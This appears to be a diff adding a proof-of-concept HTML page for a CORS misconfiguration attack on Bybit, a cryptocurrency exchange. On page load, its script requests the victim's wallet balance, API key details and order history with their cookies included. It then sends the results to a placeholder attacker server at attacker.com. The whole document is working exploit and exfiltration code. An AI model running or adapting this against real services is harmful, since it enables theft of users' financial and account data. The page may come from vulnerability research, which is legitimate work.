@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC - Bybit</title>
+</head>
+<body>
+    <h1>CORS Vulnerability PoC</h1>
+    <p>This page will attempt to steal victim's Bybit data using CORS misconfiguration.</p>
+    <div id="result"></div>
+    
+    <script>
+        // Attacker's server to receive stolen data
+        const ATTACKER_SERVER = "https://attacker.com/log";
+        
+        // Target endpoints
+        const endpoints = [
+            "https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED",
+            "https://api.bybit.com/v5/user/query-api",
+            "https://api.bybit.com/v5/order/history?category=linear&limit=10",
+        ];
+        
+        async function exploit() {
+            const results = {};
+            
+            for (const url of endpoints) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'GET',
+                        credentials: 'include',  // Send victim's cookies
+                        headers: {
+                            // If Bybit uses API keys in headers from web app
+                            // 'X-BAPI-API-KEY': localStorage.getItem('apiKey')
+                        }
+                    });
+                    
+                    const data = await response.json();
+                    results[url] = data;
+                    
+                    // Display stolen data
+                    document.getElementById('result').innerHTML += 
+                        `<h3>${url}</h3><pre>${JSON.stringify(data, null, 2)}</pre>`;
+                    
+                } catch (e) {
+                    results[url] = {error: e.message};
+                }
+            }
+            
+            // Send stolen data to attacker
+            fetch(ATTACKER_SERVER, {
+                method: 'POST',
+                body: JSON.stringify(results)
+            });
+        }
+        
+        // Auto-execute on page load
+        window.onload = exploit;
+    </script>
+</body>
+</html>
